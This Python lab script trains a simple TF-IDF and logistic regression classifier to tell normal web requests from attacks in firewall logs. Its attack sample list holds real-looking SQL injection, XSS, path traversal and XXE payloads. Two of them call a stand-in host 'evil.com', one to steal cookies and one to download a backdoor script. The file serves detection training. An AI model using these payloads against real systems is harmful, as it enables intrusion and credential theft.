"""
Lab 1: NORMAL vs ATTACK Classification
========================================
Build a binary classifier for WAF logs using TF-IDF + Logistic Regression.

This is the foundation of The Warden's ML pipeline.
"""

import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix

# ============================================================
# 1. DATASET — Simulated WAF logs
# ============================================================
# In production, these come from nginx/apache access logs.
# For this lab, we use representative examples.

normal_requests = [
    "GET /index.html HTTP/1.1",
    "GET /api/users?page=1&limit=20 HTTP/1.1",
    "POST /api/login HTTP/1.1 username=admin&password=secure123",
    "GET /static/css/main.css HTTP/1.1",
    "GET /api/products?category=electronics HTTP/1.1",
    "POST /api/contact HTTP/1.1 name=John&email=john@example.com&message=Hello",
    "GET /images/logo.png HTTP/1.1",
    "GET /api/health HTTP/1.1",
    "POST /api/register HTTP/1.1 username=newuser&email=new@test.com",
    "GET /dashboard HTTP/1.1",
    "GET /api/notifications?unread=true HTTP/1.1",
    "POST /api/feedback HTTP/1.1 rating=5&comment=Great service",
    "GET /about HTTP/1.1",
    "GET /api/search?q=python+tutorial HTTP/1.1",
    "POST /api/upload HTTP/1.1 Content-Type: multipart/form-data",
    "GET /blog/2024/03/ai-security HTTP/1.1",
    "GET /api/settings HTTP/1.1",
    "POST /api/cart/add HTTP/1.1 product_id=42&quantity=1",
    "GET /terms HTTP/1.1",
    "GET /api/orders?status=pending HTTP/1.1",
] * 40  # 800 normal samples

attack_requests = [
    "GET /api/users?id=1' UNION SELECT username,password FROM users-- HTTP/1.1",
    "GET /api/search?q=<script>alert(document.cookie)</script> HTTP/1.1",
    "GET /../../etc/passwd HTTP/1.1",
    "POST /api/login HTTP/1.1 username=admin'--&password=x",
    "GET /api/users?id=1 OR 1=1 HTTP/1.1",
    "POST /api/comment HTTP/1.1 body=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>",
    "GET /api/file?path=....//....//etc/shadow HTTP/1.1",
    "GET /api/search?q='; DROP TABLE users;-- HTTP/1.1",
    "POST /api/login HTTP/1.1 username=admin&password=' OR '1'='1",
    "GET /cgi-bin/test.cgi?cmd=cat+/etc/passwd HTTP/1.1",
    "GET /api/users?order=name;SELECT+*+FROM+information_schema.tables HTTP/1.1",
    "POST /api/data HTTP/1.1 input=<svg onload=alert(1)>",
    "GET /..%252f..%252f..%252fetc/passwd HTTP/1.1",
    "GET /api/exec?cmd=wget+http://evil.com/backdoor.sh HTTP/1.1",
    "POST /api/xml HTTP/1.1 <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    "GET /admin/../../../etc/shadow HTTP/1.1",
    "POST /api/login HTTP/1.1 username=admin&password=1' WAITFOR DELAY '0:0:5'--",
    "GET /api/redirect?url=javascript:alert(1) HTTP/1.1",
    "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1",
    "POST /api/template HTTP/1.1 input={{7*7}} HTTP/1.1",
] * 10  # 200 attack samples

# ============================================================
# 2. PREPARE DATA
# ============================================================
X_raw = normal_requests + attack_requests
y = np.array([0] * len(normal_requests) + [1] * len(attack_requests))
labels = {0: "NORMAL", 1: "ATTACK"}

# Split into train/test (80/20)
X_train_raw, X_test_raw, y_train, y_test = train_test_split(
    X_raw, y, test_size=0.2, random_state=42, stratify=y
)

print(f"Training samples: {len(X_train_raw)}")
print(f"Test samples: {len(X_test_raw)}")
print(f"Attack ratio: {sum(y_train)/len(y_train):.1%}")
print()

# ============================================================
# 3. VECTORIZE — TF-IDF
# ============================================================
# TF-IDF converts text into numerical features.
# It captures which words/patterns are important in each document
# relative to the entire corpus.

vectorizer = TfidfVectorizer(
    analyzer='char_wb',  # Character n-grams (catches obfuscation better)
    ngram_range=(3, 5),  # 3 to 5 character sequences
    max_features=5000,   # Top 5000 features
)

X_train = vectorizer.fit_transform(X_train_raw)
X_test = vectorizer.transform(X_test_raw)

print(f"Feature dimensions: {X_train.shape[1]}")
print()

# ============================================================
# 4. TRAIN — Logistic Regression
# ============================================================
model = LogisticRegression(
    class_weight='balanced',  # Handle class imbalance
    max_iter=1000,
    random_state=42,
)
model.fit(X_train, y_train)

# ============================================================
# 5. EVALUATE
# ============================================================
y_pred = model.predict(X_test)
y_proba = model.predict_proba(X_test)

print("Classification Report:")
print(classification_report(y_test, y_pred, target_names=["NORMAL", "ATTACK"]))

print("Confusion Matrix:")
cm = confusion_matrix(y_test, y_pred)
print(f"  TN={cm[0][0]:4d}  FP={cm[0][1]:4d}")
print(f"  FN={cm[1][0]:4d}  TP={cm[1][1]:4d}")
print()

# ============================================================
# 6. TEST WITH NEW REQUESTS
# ============================================================
print("=" * 60)
print("Testing with new requests:")
print("=" * 60)

test_requests = [
    "GET /api/users?page=2 HTTP/1.1",
    "GET /api/users?id=1' AND 1=1-- HTTP/1.1",
    "POST /api/search HTTP/1.1 q=machine learning security",
    "GET /api/data?file=../../etc/passwd HTTP/1.1",
]

X_new = vectorizer.transform(test_requests)
predictions = model.predict(X_new)
probabilities = model.predict_proba(X_new)

for req, pred, proba in zip(test_requests, predictions, probabilities):
    confidence = max(proba)
    label = labels[pred]
    doubt = "DOUBT" if confidence < 0.7 else ""
    print(f"\n  Request: {req[:60]}...")
    print(f"  Result:  {label} (confidence: {confidence:.2f}) {doubt}")

print("\n" + "=" * 60)
print("Lab 1 complete! You built your first WAF classifier.")
print("Next: Lab 2 — Working with probabilities and thresholds")
print("=" * 60)
